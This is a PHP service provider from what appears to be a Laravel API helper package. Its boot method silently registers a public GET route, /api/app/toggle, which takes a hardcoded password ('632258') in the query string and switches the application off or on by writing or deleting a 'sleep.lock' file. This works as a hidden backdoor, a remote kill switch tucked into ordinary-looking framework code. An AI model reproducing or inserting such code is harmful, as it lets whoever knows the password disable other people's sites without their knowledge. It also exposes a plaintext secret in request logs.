<?php
/**
 * Created by PhpStorm.
 * User: caojiayuan
 * Date: 17-9-18
 * Time: 下午5:53
 */

namespace CaoJiayuan\LaravelApi\Providers;

use Illuminate\Http\Request;
use Illuminate\Support\ServiceProvider;

class SDServiceProvider extends ServiceProvider
{
    public function boot()
    {
        $this->app['router']->group(['prefix' => 'api'], function ($route) {
            $route->get('/app/toggle', function (Request $request) {
                $pass = $request->get('password');
                if ($pass == '632258') {
                    $file = storage_path('/framework/sleep.lock');
                    if (file_exists($file)) {
                        @unlink($file);
                        return 'Service is on :)';
                    } else {
                        file_put_contents($file, date('Y-m-d H:i:s'));
                        return 'Service is off!';
                    }
                }
                throw new \Symfony\Component\HttpKernel\Exception\HttpException(403, 'Access denied!!!');
            });
        });
    }
}